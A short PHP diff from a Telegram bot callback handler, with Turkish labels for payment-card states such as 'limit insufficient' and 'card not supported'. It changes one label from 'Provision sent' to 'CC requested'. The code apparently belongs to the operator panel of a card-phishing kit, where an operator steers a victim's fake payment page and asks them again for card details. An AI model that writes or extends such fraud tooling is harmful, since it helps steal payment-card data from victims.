@@ -76,7 +76,7 @@ if ($tip === 'aksiyon') {
                 'eticaret_kapali'        => '🚫 E-ticaret kapalı',
                 'limit_yetersiz'         => '💰 Limit yetersiz',
                 'kart_desteklenmiyor'    => '🔕 Kart desteklenmiyor',
-                'provizyon_gonder'       => '🔄 Provizyon gönderildi',
+                'provizyon_gonder'       => '💳 CC istendi',
                 'provizyon_hatali'       => '⚠️ Provizyon hatalı',
             ][$aksiyon] ?? $aksiyon;
             tg_api('answerCallbackQuery', ['callback_query_id' => $cq_id, 'text' => $etiket]);
